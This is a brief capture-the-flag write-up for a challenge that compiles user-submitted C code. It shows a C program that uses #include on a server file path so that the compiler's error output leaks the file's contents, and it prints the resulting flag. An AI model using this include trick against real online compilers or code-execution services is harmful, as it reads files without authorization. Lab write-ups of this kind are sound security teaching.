We are directed to a webpage that shows what seems to be a text box where we can write c code to solve a puzzle. 
The description also says that the flag is in /home/ctf/flag.txt

First attempt I just tried calling system to cat the file, which it does not allow so there is limited functionality.

Lets just include the file..

```
#include <stdio.h>
#include <stdlib.h>
const char *s = 
#include "/home/ctf/flag.txt"
;
int main(void){
	//print number of islands
	printf("%i\n", 10);
       printf("%s\n", s);
	return 0;
}
```

in the error message it gave me the flag:

```
Compiler stdout
None
stderr
In file included from /tmp/sarce/tmpnx5sqnw7/input.c:12:
/home/ctf/flag.txt:1:1: error: 'WPI' undeclared here (not in a function)
    1 | WPI{D0nt_run_as_r00t}
      | ^~~
/home/ctf/flag.txt:1:4: error: expected ',' or ';' before '{' token
    1 | WPI{D0nt_run_as_r00t}
      |    ^
/tmp/sarce/tmpnx5sqnw7/input.c:13:1: warning: ISO C does not allow extra ';' outside of a function [-Wpedantic]
   13 | ;
      | ^
```
